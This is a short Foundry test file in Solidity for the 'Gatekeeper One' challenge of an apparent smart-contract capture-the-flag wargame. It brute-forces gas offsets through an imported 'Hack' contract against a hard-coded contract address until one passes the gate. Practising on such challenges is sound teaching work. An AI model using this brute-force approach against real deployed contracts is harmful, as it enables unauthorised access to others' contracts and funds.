pragma solidity ^0.8;

import "forge-std/Test.sol";
import "forge-std/console.sol";

import "src/13-gate-keeper-one.sol";

contract TestGateKeeperOne is Test {
    IGateKeeperOne private target;
    // GatekeeperOne private target;
    Hack private hack;

    function setUp() public {
        target = IGateKeeperOne(0x29c1d735c2762355D5f667bcF2646E9C07C23443);
        // target = new GatekeeperOne();
        hack = new Hack();
    }

    function test() public {
        for (uint256 i = 100; i < 8191; i++) {
            try hack.enter(address(target), i) {
                console.log("gas", i);
                return;
            } catch {}
        }
        revert("all failed");
    }
}
